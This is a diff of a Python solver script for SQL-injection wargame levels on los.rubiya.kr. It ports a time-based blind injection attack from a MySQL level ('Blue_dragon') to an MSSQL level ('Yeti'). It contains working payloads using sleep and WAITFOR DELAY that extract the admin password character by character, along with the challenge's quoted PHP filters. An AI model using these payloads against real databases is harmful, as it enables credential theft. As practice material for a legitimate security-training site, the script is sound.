@@ -13,32 +13,28 @@ def check_func(*args) -> bool:
 
 def main():
     '''
-    Blue_dragon 27
+    Yeti 43
 
     Time-based Blind injection
 
-    if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
-    if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
-    $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+    if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit("No Hack ~_~");
+    if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
+    $query = "select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
     echo "<hr>query : <strong>{$query}</strong><hr><br>";
-    $result = @mysqli_fetch_array(mysqli_query($db,$query));
-    if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
-    if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
-    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
+    sqlsrv_query($db,$query);
 
-    $_GET[pw] = addslashes($_GET[pw]);
-    $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
-    $result = @mysqli_fetch_array(mysqli_query($db,$query));
-    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
+    $query = "select pw from prob_yeti where id='admin'"; 
+    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
+    if($result['pw'] === $_GET['pw']) solve("yeti");
     '''
 
-    url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
+    url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
     cook = los.check_cookies(url)
 
     final_response = ''
     while 'Clear!' not in final_response:
 
-        payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
+        payload = "' if ((select len(pw) from prob_yeti where id='admin')>%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
         param = dict(pw=payload)
         len_of_key = los.find_key_len(url, param, check_func, cook)
 
@@ -47,7 +43,7 @@ def main():
         result = ''
         num_of_requests = 0
         for i in range(1, len_of_key + 1):
-            payload = f"' or id='admin' and if(ord(mid(pw,{i},1))<%s,sleep(5),0)#"
+            payload = f"' if(unicode(substring((select pw from prob_yeti where id='admin'),{i},1))<%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
             param = dict(pw=payload)
             left, num_requests = los.find_binary(url, param, check_func,
                                                  32, 127, cook)
@@ -60,7 +56,7 @@ def main():
         param = {'id': 'admin', 'pw': result}
         final_response = los.get_request(url, param, cook)
 
-    print('Blue_dragon Clear!')
+    print('Yety Clear!')
 
 
 if __name__ == '__main__':
